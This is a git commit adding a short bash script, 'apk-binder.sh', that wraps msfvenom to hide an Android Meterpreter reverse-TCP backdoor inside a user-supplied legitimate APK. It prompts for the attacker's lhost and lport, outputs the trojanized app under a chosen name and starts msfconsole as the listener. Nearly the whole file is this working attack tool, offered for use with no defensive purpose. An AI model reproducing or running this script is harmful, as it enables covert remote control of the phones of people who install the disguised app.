e8baa619f294f0cd49bb93efb1822e05e6369283
Abhay Vishwakarma <57512017+Abhaysoft-inc@users.noreply.github.com>
2020-09-24 09:36:00 +0000

    Add files via upload

---
+++ apk-binder.sh
@@ -0,0 +1,36 @@
+#Author - github.com/Abhaysoft-inc
+#Banner Start
+echo -e "\e[31m                                                              \e[0m"
+echo -e "\e[31m ▄▄▄       ██▓███   ██ ▄█▀ ▄▄▄▄    ██▓ ███▄    █ ▓█████▄ ▓█████  ██▀███  \e[0m";
+echo -e "\e[31m▒████▄    ▓██░  ██▒ ██▄█▒ ▓█████▄ ▓██▒ ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒\e[0m";
+echo -e "\e[31m▒██  ▀█▄  ▓██░ ██▓▒▓███▄░ ▒██▒ ▄██▒██▒▓██  ▀█ ██▒░██   █▌▒███   ▓██ ░▄█ ▒\e[0m";
+echo -e "\e[31m░██▄▄▄▄██ ▒██▄█▓▒ ▒▓██ █▄ ▒██░█▀  ░██░▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  \e[0m";
+echo -e "\e[31m ▓█   ▓██▒▒██▒ ░  ░▒██▒ █▄░▓█  ▀█▓░██░▒██░   ▓██░░▒████▓ ░▒████▒░██▓ ▒██▒\e[0m";
+echo -e "\e[31m ▒▒   ▓▒█░▒▓▒░ ░  ░▒ ▒▒ ▓▒░▒▓███▀▒░▓  ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░\e[0m";
+echo -e "\e[31m  ▒   ▒▒ ░░▒ ░     ░ ░▒ ▒░▒░▒   ░  ▒ ░░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░\e[0m";
+echo -e "\e[31m  ░   ▒   ░░       ░ ░░ ░  ░    ░  ▒ ░   ░   ░ ░  ░ ░  ░    ░     ░░   ░ \e[0m";
+echo -e "\e[31m      ░  ░         ░  ░    ░       ░           ░    ░       ░  ░   ░     \e[0m";
+echo -e "\e[31m                                ░                 ░                      \e[0m";
+echo -e " Author  = github.com/Abhaysoft-inc              "
+echo -e "\e[34m Website = http://www.abhaycybersolutions.ml            \e[0m "
+echo -e "\e[49m                                 \e[2m"
+
+#Bind Backdoor
+read -p "[*]Enter filepath of apk#~: " path
+read -p "[*]Enter output payload name#~: " payload
+read -p "[*]Enter lhost#~: " lhost
+read -p "[*]Enter lport#~: " lport
+echo -e "\e[31m[*]Reverse Engineering Started..;p\e[0m"
+msfvenom -x $path -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> binded.apk
+
+#Signing the apk
+echo -e "\e[31m                                                 \e[2m"
+echo -e "[-]Signing the apk                             "
+zipalign -v 4 binded.apk binded-signed.apk
+
+#listner start
+rm binded.apk && mv binded-signed.apk $payload.apk
+echo -e "\e[34m                                                \e[2m";
+read -p "[-]Start listner(Enter) or Close (Ctrl+c) : " listner
+msfconsole
+#Changing this banner doesn't make you programmer..!"
